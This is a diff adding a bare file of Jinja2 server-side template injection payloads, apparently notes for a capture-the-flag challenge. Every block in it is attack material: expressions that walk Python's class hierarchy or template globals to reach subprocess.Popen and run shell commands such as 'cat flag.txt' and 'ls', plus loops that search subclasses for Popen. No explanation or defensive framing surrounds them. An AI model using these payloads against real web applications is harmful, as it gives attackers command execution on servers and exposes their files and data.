@@ -1,0 +1,46 @@
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+{{''.__class__.__base__.__subclasses__()[535]('cat flag.txt',shell=True,stdout=-1).communicate()[0]}}
+{{''.__class__.__base__.__subclasses__()[535]('/bin/ls -l',shell=True,stdout=-1).communicate()[0]}}
+{{''.__class__.__base__.__subclasses__()[535]('cat flag.txt',stdout=-1).communicate()[0].decode}}
+{{''.__class__.__base__.__subclasses__()[535]('dir',shell=True,stdout=-1).communicate()}}
+{{''.__class__.__base__.__subclasses__()[535]('echo test',shell=True,stdout=-1).communicate()[0]}}
+{{''.__class__.__base__.__subclasses__()[535]('ls',shell=True,stdout=-1).communicate()}}
+
+
+
+
+{{__import__('subprocess').Popen(['cat','flag.txt'],stdout=-1).communicate()[0].decode()}}
+
+{{''.__class__.__base__.__subclasses__()[500]}}//jinja2 utils joiner
+
+535
+
+550<class 'werkzeug.debug.tbtools.DebugTraceback'>
+
+{%for i in range(500) %}
+{% if "Popen" in ''.__class__.__mro__[1].__subclasses__()[i].__name__%}
+{{''.__class__.__mro__[1].__subclasses__()[i]('cat flag.txt',shell=True,stdout=-1).communicate()[0]}}
+{% endif %}
+{% endfor %}
+
+{% for i in range(500) %}
+{% if "Popen" in ''.__class__.__mro__[1].__subclasses__()[i].__name__ %}
+{{i}}
+{% endif %}
+{% endfor %}
+
+
+
+
+{{globals() ['subprocess'].Popen('cat flag.txt',shell=True,stdout=-1).communicate()[0]}}
+
+{{self.__TemplateReference__context.cycler.__init__.globals__['subprocess'].Popen('cat flag.txt',shell=True,stdout=-1).communicate()[0]}}
+
+
+{{''.__class__.__mro__[1].__subclasses__()[50]}} //module
+
+{{''.__class__.__mro__[1].__subclasses__()[44]}} //map 
